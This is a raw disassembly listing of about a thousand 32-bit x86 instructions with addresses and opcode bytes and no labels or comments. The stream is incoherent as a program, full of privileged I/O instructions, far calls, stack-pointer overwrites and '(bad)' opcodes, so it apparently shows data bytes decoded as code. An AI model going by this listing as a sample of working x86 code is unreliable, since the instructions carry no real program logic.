  435b7a:	87 b1 5c c9 53 ad    	xchg   %esi,-0x52ac36a4(%ecx)
  435b80:	17                   	pop    %ss
  435b81:	84 3c a9             	test   %bh,(%ecx,%ebp,4)
  435b84:	ca ec b9             	lret   $0xb9ec
  435b87:	3a 76 ab             	cmp    -0x55(%esi),%dh
  435b8a:	fc                   	cld
  435b8b:	19 83 81 3b 92 c2    	sbb    %eax,-0x3d6dc47f(%ebx)
  435b91:	bc 42 25 e3 94       	mov    $0x94e32542,%esp
  435b96:	93                   	xchg   %eax,%ebx
  435b97:	97                   	xchg   %eax,%edi
  435b98:	c7 43 9c 10 c9 f8 e5 	movl   $0xe5f8c910,-0x64(%ebx)
  435b9f:	4b                   	dec    %ebx
  435ba0:	cb                   	lret
  435ba1:	52                   	push   %edx
  435ba2:	77 80                	ja     0x435b24
  435ba4:	29 32                	sub    %esi,(%edx)
  435ba6:	ad                   	lods   %ds:(%esi),%eax
  435ba7:	ed                   	in     (%dx),%eax
  435ba8:	2f                   	das
  435ba9:	03 33                	add    (%ebx),%esi
  435bab:	f4                   	hlt
  435bac:	3b a0 99 f4 ed ae    	cmp    -0x51120b67(%eax),%esp
  435bb2:	d5 af                	aad    $0xaf
  435bb4:	63 96 ba 7f 55 0a    	arpl   %edx,0xa557fba(%esi)
  435bba:	b2 90                	mov    $0x90,%dl
  435bbc:	69 cc 3b f1 2d be    	imul   $0xbe2df13b,%esp,%ecx
  435bc2:	0b f1                	or     %ecx,%esi
  435bc4:	16                   	push   %ss
  435bc5:	fb                   	sti
  435bc6:	b3 e4                	mov    $0xe4,%bl
  435bc8:	60                   	pusha
  435bc9:	1c 32                	sbb    $0x32,%al
  435bcb:	27                   	daa
  435bcc:	fc                   	cld
  435bcd:	fd                   	std
  435bce:	42                   	inc    %edx
  435bcf:	f6 c0 21             	test   $0x21,%al
  435bd2:	30 42 ed             	xor    %al,-0x13(%edx)
  435bd5:	ca aa 4e             	lret   $0x4eaa
  435bd8:	c2 69 cc             	ret    $0xcc69
  435bdb:	dd 43 a8             	fldl   -0x58(%ebx)
  435bde:	52                   	push   %edx
  435bdf:	97                   	xchg   %eax,%edi
  435be0:	d0 f2                	shl    $1,%dl
  435be2:	86 01                	xchg   %al,(%ecx)
  435be4:	ff c6                	inc    %esi
  435be6:	d8 c8                	fmul   %st(0),%st
  435be8:	ae                   	scas   %es:(%edi),%al
  435be9:	8d 75 c2             	lea    -0x3e(%ebp),%esi
  435bec:	3f                   	aas
  435bed:	28 7a db             	sub    %bh,-0x25(%edx)
  435bf0:	8d b9 0f 9b 3b cf    	lea    -0x30c464f1(%ecx),%edi
  435bf6:	75 26                	jne    0x435c1e
  435bf8:	71 e5                	jno    0x435bdf
  435bfa:	01 eb                	add    %ebp,%ebx
  435bfc:	34 85                	xor    $0x85,%al
  435bfe:	41                   	inc    %ecx
  435bff:	e8 3b e0 8c 22       	call   0x22d03c3f
  435c04:	9a bc c5 1d d3 dd b4 	lcall  $0xb4dd,$0xd31dc5bc
  435c0b:	08 1d f3 2b 74 98    	or     %bl,0x98742bf3
  435c11:	f1                   	int1
  435c12:	eb 39                	jmp    0x435c4d
  435c14:	58                   	pop    %eax
  435c15:	ba 98 03 f5 a5       	mov    $0xa5f50398,%edx
  435c1a:	53                   	push   %ebx
  435c1b:	57                   	push   %edi
  435c1c:	d0 49 d1             	rorb   $1,-0x2f(%ecx)
  435c1f:	8f 40 82             	pop    -0x7e(%eax)
  435c22:	ad                   	lods   %ds:(%esi),%eax
  435c23:	de 66 07             	fisubs 0x7(%esi)
  435c26:	4d                   	dec    %ebp
  435c27:	c3                   	ret
  435c28:	06                   	push   %es
  435c29:	a3 11 3d 67 a0       	mov    %eax,0xa0673d11
  435c2e:	dd bb 8d 86 fa c8    	fnstsw -0x37057973(%ebx)
  435c34:	96                   	xchg   %eax,%esi
  435c35:	96                   	xchg   %eax,%esi
  435c36:	19 ed                	sbb    %ebp,%ebp
  435c38:	e8 db 9f 86 61       	call   0x61c9fc18
  435c3d:	b9 6e fc bb 72       	mov    $0x72bbfc6e,%ecx
  435c42:	ab                   	stos   %eax,%es:(%edi)
  435c43:	e6 62                	out    %al,$0x62
  435c45:	f2 a3 2c 2f b3 4c    	repnz mov %eax,0x4cb32f2c
  435c4b:	69 37 e8 49 b5 52    	imul   $0x52b549e8,(%edi),%esi
  435c51:	99                   	cltd
  435c52:	85 9f 5a 43 53 49    	test   %ebx,0x4953435a(%edi)
  435c58:	d1 db                	rcr    $1,%ebx
  435c5a:	33 46 1c             	xor    0x1c(%esi),%eax
  435c5d:	c3                   	ret
  435c5e:	b7 2b                	mov    $0x2b,%bh
  435c60:	e7 c0                	out    %eax,$0xc0
  435c62:	f5                   	cmc
  435c63:	2d 65 9e e3 f7       	sub    $0xf7e39e65,%eax
  435c68:	2c 79                	sub    $0x79,%al
  435c6a:	e6 70                	out    %al,$0x70
  435c6c:	f6 9d ba eb 27 c4    	negb   -0x3bd81446(%ebp)
  435c72:	2a 41 b9             	sub    -0x47(%ecx),%al
  435c75:	9d                   	popf
  435c76:	c4 3d c7 87 95 1f    	les    0x1f9587c7,%edi
  435c7c:	54                   	push   %esp
  435c7d:	ef                   	out    %eax,(%dx)
  435c7e:	b2 c2                	mov    $0xc2,%dl
  435c80:	d0 d9                	rcr    $1,%cl
  435c82:	37                   	aaa
  435c83:	f3 fd                	repz std
  435c85:	bf 2b f4 81 37       	mov    $0x3781f42b,%edi
  435c8a:	a8 6c                	test   $0x6c,%al
  435c8c:	3d ec 37 03 a8       	cmp    $0xa80337ec,%eax
  435c91:	6a 6c                	push   $0x6c
  435c93:	70 86                	jo     0x435c1b
  435c95:	85 d2                	test   %edx,%edx
  435c97:	ad                   	lods   %ds:(%esi),%eax
  435c98:	2c 5a                	sub    $0x5a,%al
  435c9a:	48                   	dec    %eax
  435c9b:	75 09                	jne    0x435ca6
  435c9d:	c9                   	leave
  435c9e:	e8 c7 7e c6 c0       	call   0xc109db6a
  435ca3:	2f                   	das
  435ca4:	0a 21                	or     (%ecx),%ah
  435ca6:	59                   	pop    %ecx
  435ca7:	fc                   	cld
  435ca8:	97                   	xchg   %eax,%edi
  435ca9:	4b                   	dec    %ebx
  435caa:	35 8c df d9 33       	xor    $0x33d9df8c,%eax
  435caf:	f3 3b db             	repz cmp %ebx,%ebx
  435cb2:	09 d3                	or     %edx,%ebx
  435cb4:	4f                   	dec    %edi
  435cb5:	69 ba 09 a9 73 08 99 	imul   $0x27cdbf99,0x873a909(%edx),%edi
  435cbc:	bf cd 27 
  435cbf:	dd 4b a4             	fisttpll -0x5c(%ebx)
  435cc2:	d6                   	salc
  435cc3:	f1                   	int1
  435cc4:	3e 1d 07 c2 79 f8    	ds sbb $0xf879c207,%eax
  435cca:	98                   	cwtl
  435ccb:	02 7d 74             	add    0x74(%ebp),%bh
  435cce:	08 ae 74 eb ce 1c    	or     %ch,0x1cceeb74(%esi)
  435cd4:	03 47 94             	add    -0x6c(%edi),%eax
  435cd7:	eb c0                	jmp    0x435c99
  435cd9:	a2 a7 ab 31 c8       	mov    %al,0xc831aba7
  435cde:	16                   	push   %ss
  435cdf:	0d d8 de 7b 91       	or     $0x917bded8,%eax
  435ce4:	a3 43 21 31 a5       	mov    %eax,0xa5312143
  435ce9:	2d 50 4c 32 4c       	sub    $0x4c324c50,%eax
  435cee:	03 8b 1c 04 de 6d    	add    0x6dde041c(%ebx),%ecx
  435cf4:	3a 08                	cmp    (%eax),%cl
  435cf6:	e3 7e                	jecxz  0x435d76
  435cf8:	96                   	xchg   %eax,%esi
  435cf9:	8c fc                	mov    %?,%esp
  435cfb:	2b 43 55             	sub    0x55(%ebx),%eax
  435cfe:	79 cb                	jns    0x435ccb
  435d00:	01 94 8e 10 d7 26 44 	add    %edx,0x4426d710(%esi,%ecx,4)
  435d07:	8e 9c 41 1d d9 e6 48 	mov    0x48e6d91d(%ecx,%eax,2),%ds
  435d0e:	f6 cf e5             	test   $0xe5,%bh
  435d11:	4c                   	dec    %esp
  435d12:	13 6d e4             	adc    -0x1c(%ebp),%ebp
  435d15:	4d                   	dec    %ebp
  435d16:	b8 c1 60 3e a0       	mov    $0xa03e60c1,%eax
  435d1b:	4b                   	dec    %ebx
  435d1c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  435d1d:	43                   	inc    %ebx
  435d1e:	79 2d                	jns    0x435d4d
  435d20:	db 47 96             	fildl  -0x6a(%edi)
  435d23:	99                   	cltd
  435d24:	aa                   	stos   %al,%es:(%edi)
  435d25:	6e                   	outsb  %ds:(%esi),(%dx)
  435d26:	ba b9 ed 5e fd       	mov    $0xfd5eedb9,%edx
  435d2b:	52                   	push   %edx
  435d2c:	6b 5e 3e cd          	imul   $0xffffffcd,0x3e(%esi),%ebx
  435d30:	e7 8d                	out    %eax,$0x8d
  435d32:	1c 6a                	sbb    $0x6a,%al
  435d34:	99                   	cltd
  435d35:	75 e9                	jne    0x435d20
  435d37:	4f                   	dec    %edi
  435d38:	91                   	xchg   %eax,%ecx
  435d39:	42                   	inc    %edx
  435d3a:	49                   	dec    %ecx
  435d3b:	48                   	dec    %eax
  435d3c:	3c ab                	cmp    $0xab,%al
  435d3e:	e0 21                	loopne 0x435d61
  435d40:	13 23                	adc    (%ebx),%esp
  435d42:	90                   	nop
  435d43:	9d                   	popf
  435d44:	4b                   	dec    %ebx
  435d45:	b9 18 fe 46 ef       	mov    $0xef46fe18,%ecx
  435d4a:	e2 58                	loop   0x435da4
  435d4c:	35 3d a1 89 90       	xor    $0x9089a13d,%eax
  435d51:	76 1e                	jbe    0x435d71
  435d53:	b0 33                	mov    $0x33,%al
  435d55:	15 d9 26 66 b2       	adc    $0xb26626d9,%eax
  435d5a:	1e                   	push   %ds
  435d5b:	8c b3 12 ea b4 15    	mov    %?,0x15b4ea12(%ebx)
  435d61:	36 9b                	ss fwait
  435d63:	43                   	inc    %ebx
  435d64:	96                   	xchg   %eax,%esi
  435d65:	b7 ba                	mov    $0xba,%bh
  435d67:	92                   	xchg   %eax,%edx
  435d68:	74 72                	je     0x435ddc
  435d6a:	9e                   	sahf
  435d6b:	c9                   	leave
  435d6c:	22 4c 7a c3          	and    -0x3d(%edx,%edi,2),%cl
  435d70:	60                   	pusha
  435d71:	08 e2                	or     %ah,%dl
  435d73:	46                   	inc    %esi
  435d74:	10 9f 6c 5d 9b 04    	adc    %bl,0x49b5d6c(%edi)
  435d7a:	36 df 56 cd          	fists  %ss:-0x33(%esi)
  435d7e:	26 84 b9 8a 96 04 68 	test   %bh,%es:0x6804968a(%ecx)
  435d85:	b3 35                	mov    $0x35,%bl
  435d87:	59                   	pop    %ecx
  435d88:	67 02 41 32          	add    0x32(%bx,%di),%al
  435d8c:	41                   	inc    %ecx
  435d8d:	4a                   	dec    %edx
  435d8e:	85 35 43 ce 63 9b    	test   %esi,0x9b63ce43
  435d94:	71 f5                	jno    0x435d8b
  435d96:	51                   	push   %ecx
  435d97:	df 40 9d             	filds  -0x63(%eax)
  435d9a:	8d 85 88 ba ba 58    	lea    0x58baba88(%ebp),%eax
  435da0:	37                   	aaa
  435da1:	67 46                	addr16 inc %esi
  435da3:	b8 01 e9 b5 12       	mov    $0x12b5e901,%eax
  435da8:	c6                   	(bad)
  435da9:	79 0a                	jns    0x435db5
  435dab:	f0 0c 71             	lock or $0x71,%al
  435dae:	03 21                	add    (%ecx),%esp
  435db0:	f0 67 0a ca          	lock addr16 or %dl,%cl
  435db4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  435db5:	a0 a5 7a cf f6       	mov    0xf6cf7aa5,%al
  435dba:	2e fa                	cs cli
  435dbc:	3c 62                	cmp    $0x62,%al
  435dbe:	4a                   	dec    %edx
  435dbf:	2b 57 c4             	sub    -0x3c(%edi),%edx
  435dc2:	2e 2f                	cs das
  435dc4:	c0 12 6f             	rclb   $0x6f,(%edx)
  435dc7:	10 67 04             	adc    %ah,0x4(%edi)
  435dca:	b8 8d 28 27 48       	mov    $0x4827288d,%eax
  435dcf:	b9 99 37 08 8b       	mov    $0x8b083799,%ecx
  435dd4:	24 36                	and    $0x36,%al
  435dd6:	36 35 50 1a 98 03    	ss xor $0x3981a50,%eax
  435ddc:	c9                   	leave
  435ddd:	e5 a4                	in     $0xa4,%eax
  435ddf:	01 5f 34             	add    %ebx,0x34(%edi)
  435de2:	67 77 fd             	addr16 ja 0x435de2
  435de5:	04 d4                	add    $0xd4,%al
  435de7:	08 8a 2f c4 ab c8    	or     %cl,-0x37543bd1(%edx)
  435ded:	c5 71 80             	lds    -0x80(%ecx),%esi
  435df0:	c8 60 46 fc          	enter  $0x4660,$0xfc
  435df4:	22 d1                	and    %cl,%dl
  435df6:	05 d8 d5 42 01       	add    $0x142d5d8,%eax
  435dfb:	fc                   	cld
  435dfc:	b9 be 9b fe fc       	mov    $0xfcfe9bbe,%ecx
  435e01:	09 ea                	or     %ebp,%edx
  435e03:	1b 5f 32             	sbb    0x32(%edi),%ebx
  435e06:	b2 f5                	mov    $0xf5,%dl
  435e08:	cc                   	int3
  435e09:	ed                   	in     (%dx),%eax
  435e0a:	56                   	push   %esi
  435e0b:	ac                   	lods   %ds:(%esi),%al
  435e0c:	14 27                	adc    $0x27,%al
  435e0e:	d8 86 11 19 48 09    	fadds  0x9481911(%esi)
  435e14:	09 ed                	or     %ebp,%ebp
  435e16:	c4                   	(bad)
  435e17:	f8                   	clc
  435e18:	39 e6                	cmp    %esp,%esi
  435e1a:	5d                   	pop    %ebp
  435e1b:	f1                   	int1
  435e1c:	75 d9                	jne    0x435df7
  435e1e:	c3                   	ret
  435e1f:	b5 e4                	mov    $0xe4,%ch
  435e21:	94                   	xchg   %eax,%esp
  435e22:	b0 15                	mov    $0x15,%al
  435e24:	9b                   	fwait
  435e25:	69 2c 91 40 15 f4 b4 	imul   $0xb4f41540,(%ecx,%edx,4),%ebp
  435e2c:	0e                   	push   %cs
  435e2d:	4f                   	dec    %edi
  435e2e:	e1 ac                	loope  0x435ddc
  435e30:	61                   	popa
  435e31:	57                   	push   %edi
  435e32:	3e a2 c8 8f 16 17    	mov    %al,%ds:0x17168fc8
  435e38:	59                   	pop    %ecx
  435e39:	0c 49                	or     $0x49,%al
  435e3b:	bd 60 e9 33 eb       	mov    $0xeb33e960,%ebp
  435e40:	3a a8 e7 f6 fb bc    	cmp    -0x43040919(%eax),%ch
  435e46:	65 4d                	gs dec %ebp
  435e48:	3b 24 97             	cmp    (%edi,%edx,4),%esp
  435e4b:	5e                   	pop    %esi
  435e4c:	d1 fc                	sar    $1,%esp
  435e4e:	82 47 4e 67          	addb   $0x67,0x4e(%edi)
  435e52:	ee                   	out    %al,(%dx)
  435e53:	48                   	dec    %eax
  435e54:	10 93 97 13 c5 89    	adc    %dl,-0x763aec69(%ebx)
  435e5a:	bc 19 4c 7f 9b       	mov    $0x9b7f4c19,%esp
  435e5f:	c3                   	ret
  435e60:	27                   	daa
  435e61:	4a                   	dec    %edx
  435e62:	d4 b3                	aam    $0xb3
  435e64:	e3 3e                	jecxz  0x435ea4
  435e66:	08 e0                	or     %ah,%al
  435e68:	80 a5 7d 83 52 0f 47 	andb   $0x47,0xf52837d(%ebp)
  435e6f:	31 d0                	xor    %edx,%eax
  435e71:	41                   	inc    %ecx
  435e72:	7f 9a                	jg     0x435e0e
  435e74:	62 af e1 a8 d0 1c    	bound  %ebp,0x1cd0a8e1(%edi)
  435e7a:	9f                   	lahf
  435e7b:	eb db                	jmp    0x435e58
  435e7d:	26 93                	es xchg %eax,%ebx
  435e7f:	a9 18 6b 9a 6b       	test   $0x6b9a6b18,%eax
  435e84:	13 9d 1c fc 6f 5b    	adc    0x5b6ffc1c(%ebp),%ebx
  435e8a:	94                   	xchg   %eax,%esp
  435e8b:	de ca                	fmulp  %st,%st(2)
  435e8d:	81 90 32 17 3f 38 ac 	adcl   $0x6dbf02ac,0x383f1732(%eax)
  435e94:	02 bf 6d 
  435e97:	7a 92                	jp     0x435e2b
  435e99:	a2 3d e3 8a 5c       	mov    %al,0x5c8ae33d
  435e9e:	bb d9 75 55 62       	mov    $0x625575d9,%ebx
  435ea3:	f0 b1 ae             	lock mov $0xae,%cl
  435ea6:	00 1a                	add    %bl,(%edx)
  435ea8:	2a 0b                	sub    (%ebx),%cl
  435eaa:	2b e3                	sub    %ebx,%esp
  435eac:	0d 37 24 5f b1       	or     $0xb15f2437,%eax
  435eb1:	7b 2b                	jnp    0x435ede
  435eb3:	37                   	aaa
  435eb4:	26 83 59 27 b5       	sbbl   $0xffffffb5,%es:0x27(%ecx)
  435eb9:	dd bf 8d 29 b0 47    	fnstsw 0x47b0298d(%edi)
  435ebf:	23 7c 00 64          	and    0x64(%eax,%eax,1),%edi
  435ec3:	dc 24 53             	fsubl  (%ebx,%edx,2)
  435ec6:	f5                   	cmc
  435ec7:	d1 25 3d e9 ff 19    	shll   $1,0x19ffe93d
  435ecd:	dc b5 92 f2 98 b6    	fdivl  -0x49670d6e(%ebp)
  435ed3:	21 dc                	and    %ebx,%esp
  435ed5:	da 04 8d 2d 85 d4 8a 	fiaddl -0x752b7ad3(,%ecx,4)
  435edc:	9a 00 53 63 98 4e b7 	lcall  $0xb74e,$0x98635300
  435ee3:	5f                   	pop    %edi
  435ee4:	8e 6d 8a             	mov    -0x76(%ebp),%gs
  435ee7:	9d                   	popf
  435ee8:	e2 79                	loop   0x435f63
  435eea:	85 21                	test   %esp,(%ecx)
  435eec:	25 bd 80 d0 0f       	and    $0xfd080bd,%eax
  435ef1:	3d 09 c8 ab 2c       	cmp    $0x2cabc809,%eax
  435ef6:	1f                   	pop    %ds
  435ef7:	b6 89                	mov    $0x89,%dh
  435ef9:	26 5c                	es pop %esp
  435efb:	ae                   	scas   %es:(%edi),%al
  435efc:	f1                   	int1
  435efd:	52                   	push   %edx
  435efe:	4c                   	dec    %esp
  435eff:	d0 61 82             	shlb   $1,-0x7e(%ecx)
  435f02:	7a f7                	jp     0x435efb
  435f04:	0c bb                	or     $0xbb,%al
  435f06:	5f                   	pop    %edi
  435f07:	8b be 8f c1 74 32    	mov    0x3274c18f(%esi),%edi
  435f0d:	6f                   	outsl  %ds:(%esi),(%dx)
  435f0e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435f0f:	b5 53                	mov    $0x53,%ch
  435f11:	97                   	xchg   %eax,%edi
  435f12:	41                   	inc    %ecx
  435f13:	e6 c7                	out    %al,$0xc7
  435f15:	1a 66 12             	sbb    0x12(%esi),%ah
  435f18:	81 4b ae d6 dc 36 64 	orl    $0x6436dcd6,-0x52(%ebx)
  435f1f:	4f                   	dec    %edi
  435f20:	ae                   	scas   %es:(%edi),%al
  435f21:	1b 8a e3 4f 63 57    	sbb    0x57634fe3(%edx),%ecx
  435f27:	72 25                	jb     0x435f4e
  435f29:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435f2a:	07                   	pop    %es
  435f2b:	46                   	inc    %esi
  435f2c:	88 dd                	mov    %bl,%ch
  435f2e:	d4 3e                	aam    $0x3e
  435f30:	af                   	scas   %es:(%edi),%eax
  435f31:	47                   	inc    %edi
  435f32:	08 cf                	or     %cl,%bh
  435f34:	13 c4                	adc    %esp,%eax
  435f36:	42                   	inc    %edx
  435f37:	28 e4                	sub    %ah,%ah
  435f39:	4d                   	dec    %ebp
  435f3a:	e3 7b                	jecxz  0x435fb7
  435f3c:	90                   	nop
  435f3d:	19 6a 9e             	sbb    %ebp,-0x62(%edx)
  435f40:	af                   	scas   %es:(%edi),%eax
  435f41:	cf                   	iret
  435f42:	b4 1c                	mov    $0x1c,%ah
  435f44:	eb 6e                	jmp    0x435fb4
  435f46:	30 4e c3             	xor    %cl,-0x3d(%esi)
  435f49:	c5 32                	lds    (%edx),%esi
  435f4b:	5e                   	pop    %esi
  435f4c:	1c 7a                	sbb    $0x7a,%al
  435f4e:	3b a4 72 2a f1 00 20 	cmp    0x2000f12a(%edx,%esi,2),%esp
  435f55:	7b 28                	jnp    0x435f7f
  435f57:	5b                   	pop    %ebx
  435f58:	0a 4e 2c             	or     0x2c(%esi),%cl
  435f5b:	c2 2f 87             	ret    $0x872f
  435f5e:	60                   	pusha
  435f5f:	5e                   	pop    %esi
  435f60:	c9                   	leave
  435f61:	9f                   	lahf
  435f62:	4b                   	dec    %ebx
  435f63:	92                   	xchg   %eax,%edx
  435f64:	61                   	popa
  435f65:	79 16                	jns    0x435f7d
  435f67:	e0 26                	loopne 0x435f8f
  435f69:	28 f4                	sub    %dh,%ah
  435f6b:	de 10                	ficoms (%eax)
  435f6d:	fc                   	cld
  435f6e:	f8                   	clc
  435f6f:	2d 23 11 35 e7       	sub    $0xe7351123,%eax
  435f74:	f5                   	cmc
  435f75:	7d ff                	jge    0x435f76
  435f77:	e3 25                	jecxz  0x435f9e
  435f79:	5a                   	pop    %edx
  435f7a:	a8 6c                	test   $0x6c,%al
  435f7c:	34 0a                	xor    $0xa,%al
  435f7e:	0b 22                	or     (%edx),%esp
  435f80:	c6                   	(bad)
  435f81:	58                   	pop    %eax
  435f82:	61                   	popa
  435f83:	5c                   	pop    %esp
  435f84:	fe 07                	incb   (%edi)
  435f86:	d2 b5 53 87 15 e8    	shlb   %cl,-0x17ea78ad(%ebp)
  435f8c:	80 a9 bf 25 38 98 ab 	subb   $0xab,-0x67c7da41(%ecx)
  435f93:	18 b2 61 76 bb 45    	sbb    %dh,0x45bb7661(%edx)
  435f99:	12 f1                	adc    %cl,%dh
  435f9b:	62 7e 4c             	bound  %edi,0x4c(%esi)
  435f9e:	73 52                	jae    0x435ff2
  435fa0:	6c                   	insb   (%dx),%es:(%edi)
  435fa1:	e2 89                	loop   0x435f2c
  435fa3:	86 1e                	xchg   %bl,(%esi)
  435fa5:	5e                   	pop    %esi
  435fa6:	80 e6 18             	and    $0x18,%dh
  435fa9:	21 8a 07 e2 f7 d5    	and    %ecx,-0x2a081df9(%edx)
  435faf:	66 dd 28             	data16 (bad) (%eax)
  435fb2:	6c                   	insb   (%dx),%es:(%edi)
  435fb3:	02 7a 40             	add    0x40(%edx),%bh
  435fb6:	57                   	push   %edi
  435fb7:	15 50 07 b5 0a       	adc    $0xab50750,%eax
  435fbc:	79 46                	jns    0x436004
  435fbe:	cd da                	int    $0xda
  435fc0:	f3 d6                	repz salc
  435fc2:	be 90 76 3d b4       	mov    $0xb43d7690,%esi
  435fc7:	7f 69                	jg     0x436032
  435fc9:	28 ac 8e 1f f8 ab ff 	sub    %ch,-0x5407e1(%esi,%ecx,4)
  435fd0:	01 ba 1f 2c a9 12    	add    %edi,0x12a92c1f(%edx)
  435fd6:	92                   	xchg   %eax,%edx
  435fd7:	e6 e9                	out    %al,$0xe9
  435fd9:	f9                   	stc
  435fda:	ea 5b a7 c0 cf d3 4a 	ljmp   $0x4ad3,$0xcfc0a75b
  435fe1:	76 8b                	jbe    0x435f6e
  435fe3:	61                   	popa
  435fe4:	37                   	aaa
  435fe5:	34 5d                	xor    $0x5d,%al
  435fe7:	32 dd                	xor    %ch,%bl
  435fe9:	7f 68                	jg     0x436053
  435feb:	ad                   	lods   %ds:(%esi),%eax
  435fec:	ff                   	(bad)
  435fed:	bc a1 d8 9d e0       	mov    $0xe09dd8a1,%esp
  435ff2:	2c a4                	sub    $0xa4,%al
  435ff4:	64 5b                	fs pop %ebx
  435ff6:	3b 00                	cmp    (%eax),%eax
  435ff8:	aa                   	stos   %al,%es:(%edi)
  435ff9:	6f                   	outsl  %ds:(%esi),(%dx)
  435ffa:	0f c2 b8 1b aa 07 e5 	cmpps  $0x4c,-0x1af855e5(%eax),%xmm7
  436001:	4c 
  436002:	de 53 1a             	ficoms 0x1a(%ebx)
  436005:	cf                   	iret
  436006:	32 ef                	xor    %bh,%ch
  436008:	92                   	xchg   %eax,%edx
  436009:	7d 79                	jge    0x436084
  43600b:	90                   	nop
  43600c:	06                   	push   %es
  43600d:	eb 86                	jmp    0x435f95
  43600f:	bc 4d 28 30 7f       	mov    $0x7f30284d,%esp
  436014:	d5 53                	aad    $0x53
  436016:	32 db                	xor    %bl,%bl
  436018:	37                   	aaa
  436019:	9a ba 2a 2c 34 94 91 	lcall  $0x9194,$0x342c2aba
  436020:	0a 66 c3             	or     -0x3d(%esi),%ah
  436023:	b1 c8                	mov    $0xc8,%cl
  436025:	b3 85                	mov    $0x85,%bl
  436027:	56                   	push   %esi
  436028:	bd 13 b7 26 6d       	mov    $0x6d26b713,%ebp
  43602d:	d2 2f                	shrb   %cl,(%edi)
  43602f:	7f b6                	jg     0x435fe7
  436031:	0a 32                	or     (%edx),%dh
  436033:	40                   	inc    %eax
  436034:	8c bc eb d1 af f8 50 	mov    %?,0x50f8afd1(%ebx,%ebp,8)
  43603b:	70 61                	jo     0x43609e
  43603d:	4f                   	dec    %edi
  43603e:	31 c3                	xor    %eax,%ebx
  436040:	16                   	push   %ss
  436041:	bd 08 29 bb 5f       	mov    $0x5fbb2908,%ebp
  436046:	92                   	xchg   %eax,%edx
  436047:	b7 9b                	mov    $0x9b,%bh
  436049:	16                   	push   %ss
  43604a:	b8 d8 8b 63 5b       	mov    $0x5b638bd8,%eax
  43604f:	84 39                	test   %bh,(%ecx)
  436051:	88 a6 0f 46 43 a6    	mov    %ah,-0x59bcb9f1(%esi)
  436057:	f2 0f f5             	(bad)
  43605a:	5c                   	pop    %esp
  43605b:	8f                   	(bad)
  43605c:	de 97 54 b2 60 ff    	ficoms -0x9f4dac(%edi)
  436062:	2c dd                	sub    $0xdd,%al
  436064:	f5                   	cmc
  436065:	4b                   	dec    %ebx
  436066:	e2 d6                	loop   0x43603e
  436068:	25 d1 f6 f4 ef       	and    $0xeff4f6d1,%eax
  43606d:	32 de                	xor    %dh,%bl
  43606f:	8b cc                	mov    %esp,%ecx
  436071:	eb 91                	jmp    0x436004
  436073:	65 c1 34 98 9d       	shll   $0x9d,%gs:(%eax,%ebx,4)
  436078:	5f                   	pop    %edi
  436079:	79 ed                	jns    0x436068
  43607b:	ad                   	lods   %ds:(%esi),%eax
  43607c:	97                   	xchg   %eax,%edi
  43607d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  43607e:	f3 0b de             	repz or %esi,%ebx
  436081:	ca 77 8c             	lret   $0x8c77
  436084:	69 df fc 41 7b d5    	imul   $0xd57b41fc,%edi,%ebx
  43608a:	fe 0b                	decb   (%ebx)
  43608c:	61                   	popa
  43608d:	38 4c 22 fe          	cmp    %cl,-0x2(%edx,%eiz,1)
  436091:	42                   	inc    %edx
  436092:	37                   	aaa
  436093:	e8 42 10 fc 15       	call   0x163f70da
  436098:	e0 46                	loopne 0x4360e0
  43609a:	23 9b 45 16 2a ef    	and    -0x10d5e9bb(%ebx),%ebx
  4360a0:	48                   	dec    %eax
  4360a1:	06                   	push   %es
  4360a2:	d6                   	salc
  4360a3:	ee                   	out    %al,(%dx)
  4360a4:	52                   	push   %edx
  4360a5:	69 07 84 7c 5d 71    	imul   $0x715d7c84,(%edi),%eax
  4360ab:	2e eb f4             	cs jmp 0x4360a2
  4360ae:	90                   	nop
  4360af:	eb 0d                	jmp    0x4360be
  4360b1:	7b 7d                	jnp    0x436130
  4360b3:	6a 8f                	push   $0xffffff8f
  4360b5:	8f                   	(bad)
  4360b6:	37                   	aaa
  4360b7:	9f                   	lahf
  4360b8:	d5 a9                	aad    $0xa9
  4360ba:	1b bb 73 ef a4 05    	sbb    0x5a4ef73(%ebx),%edi
  4360c0:	5a                   	pop    %edx
  4360c1:	f6 83 d0 5a 4f 21 72 	testb  $0x72,0x214f5ad0(%ebx)
  4360c8:	8b 0f                	mov    (%edi),%ecx
  4360ca:	1b 1d 65 f4 16 63    	sbb    0x6316f465,%ebx
  4360d0:	9d                   	popf
  4360d1:	f4                   	hlt
  4360d2:	4c                   	dec    %esp
  4360d3:	b7 28                	mov    $0x28,%bh
  4360d5:	8b aa 08 cc 67 ff    	mov    -0x9833f8(%edx),%ebp
  4360db:	cb                   	lret
  4360dc:	94                   	xchg   %eax,%esp
  4360dd:	e7 fc                	out    %eax,$0xfc
  4360df:	b3 f4                	mov    $0xf4,%bl
  4360e1:	77 15                	ja     0x4360f8
  4360e3:	e6 e6                	out    %al,$0xe6
  4360e5:	e0 ae                	loopne 0x436095
  4360e7:	3b 75 90             	cmp    -0x70(%ebp),%esi
  4360ea:	1f                   	pop    %ds
  4360eb:	c8 d9 ce 3a          	enter  $0xced9,$0x3a
  4360ef:	03 ce                	add    %esi,%ecx
  4360f1:	b6 af                	mov    $0xaf,%dh
  4360f3:	d9 8f 4e c1 6e 70    	(bad) 0x706ec14e(%edi)
  4360f9:	6d                   	insl   (%dx),%es:(%edi)
  4360fa:	2c c7                	sub    $0xc7,%al
  4360fc:	ea d1 cd d5 c9 b5 7f 	ljmp   $0x7fb5,$0xc9d5cdd1
  436103:	b6 c0                	mov    $0xc0,%dh
  436105:	bc 16 7d 73 83       	mov    $0x83737d16,%esp
  43610a:	89 f0                	mov    %esi,%eax
  43610c:	9e                   	sahf
  43610d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  43610e:	e3 9b                	jecxz  0x4360ab
  436110:	bd a3 d9 74 e8       	mov    $0xe874d9a3,%ebp
  436115:	37                   	aaa
  436116:	52                   	push   %edx
  436117:	14 87                	adc    $0x87,%al
  436119:	c8 e9 67 28          	enter  $0x67e9,$0x28
  43611d:	86 27                	xchg   %ah,(%edi)
  43611f:	ce                   	into
  436120:	3c 84                	cmp    $0x84,%al
  436122:	e7 c0                	out    %eax,$0xc0
  436124:	0b 0d 9e c7 83 e9    	or     0xe983c79e,%ecx
  43612a:	2d f8 1d da ec       	sub    $0xecda1df8,%eax
  43612f:	61                   	popa
  436130:	37                   	aaa
  436131:	e2 95                	loop   0x4360c8
